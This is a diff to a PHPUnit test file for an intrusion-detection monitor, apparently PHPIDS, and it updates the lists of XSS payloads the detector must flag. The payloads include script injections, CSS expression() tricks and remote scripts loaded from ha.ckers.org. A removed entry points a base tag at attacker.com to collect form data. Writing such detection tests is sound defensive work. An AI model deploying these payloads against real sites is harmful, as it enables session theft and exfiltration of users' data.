@@ -613,7 +613,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                         \'s';
         $exploits[] = "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
                         's";
-		$exploits[] = 'lo=/,Batman/,alert(\'Batman flew here\')';
+        $exploits[] = 'lo=/,Batman/,alert(\'Batman flew here\')';
 
         $this->_testForPlainEvent($exploits);
 
@@ -1283,21 +1283,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits = array();
         $exploits['html_1'] = '<a/onmouseover=alert(document.cookies) href="http://www.google.de/">Google</a>';
         $exploits['html_2'] = '<table width="500"><tr><th>Test</th><iframe/onload=alert(1)> </tr><tr><td>test</td></tr></table>';
-        $exploits['html_3'] = '<table>
-                             <tr>
-                             <td class="TableRowAlt">
-                             <img src="templates/default/images/carat.gif" border="0" width="8" height="8" alt="" style="vertical-align: middle;" />&nbsp;                                <a href="http://sla.ckers.org/forum/read.php?13,22665">FEEDBACK on my thesis on Session Management: SESSION FIXATION</a>
-                             </td>
-                             <td class="TableRowAlt" align="center">81&nbsp;</td>
-                             <td class="TableRowAlt" align="center" nowrap="nowrap">1&nbsp;</td>
-                             <td class="TableRowAlt" nowrap="nowrap"><a href="http://sla.ckers.org/forum/">euronymous</a></td>
-                             <td class="TableRowAlt SmallFont" nowrap="nowrap">
-                             06/01/2008 04:05AM<br />
-                             <span class="ListSubText">
-                             <a href="http://sla.ckers.org/forum/read.php?13,22665,22665#msg-22665">Last Post</a> by <a href="http://sla.ckers.org/forum/profile.php?13,1410">euronymous</a>        </span>
-                             </td>
-                             </tr>
-                              </table><base href="http://attacker.com/collect.php" />';
+        $exploits['html_3'] = '<a style="background:url(//lo/)}lo:expression\(alert(1)));">lo</a>';
         $exploits['html_4'] = '<div style="-moz-binding:url(http://h4k.in/mozxss.xml#xss)">hello!</div>';
         $exploits['html_5'] = '<img src="javascript:alert(1)">';
         $exploits['html_6'] = '<script>alert(1)</script><h1>headline</h1><p>copytext</p>';
@@ -1313,6 +1299,9 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits['html_16'] = '<img src= # onerror = alert(1) <b>foo</b>';
         $exploits['html_17'] = '<a style="background:url(//lo/\\)}lo:expression\000028alert\000028/1/\000029\000029/*lo);">lo</a>';
         $exploits['html_18'] = '<?xml:namespace prefix=xss><?import namespace=xss implementation=http://ha.ckers.org/xss.htc><xss:*>lo</xss:*>';
+        $exploits['html_19'] = '<a style="background:url(//mh.mh/\)!*mh:expression\(write\(1\));">lo</a> // you discovered';
+        $exploits['html_20'] = '<a href="http://ha.ckers.org/xss.css" style="background:url(/**/javascript:document.documentElement.firstChild.lastChild.href=document.documentElement.firstChild.nextSibling.lastChild.previousSibling.previousSibling.lastChild.previousSibling.previousSibling.lastChild.lastChild.lastChild.lastChild.lastChild.href);">lo</a>';
+        $exploits['html_21'] = "<img src=http://lo.lo/lo = '> ' onerror=alert(1)//";
 
         $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
         $this->_testForPlainEvent($exploits);
@@ -1325,7 +1314,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $result = $test->run();
         
         $this->assertFalse($result->hasEvent(1));
-        $this->assertImpact($result, 563, 570);
+        $this->assertImpact($result, 627, 634);
     }
 
     public function testAllowedHTMLScanningNegative() {
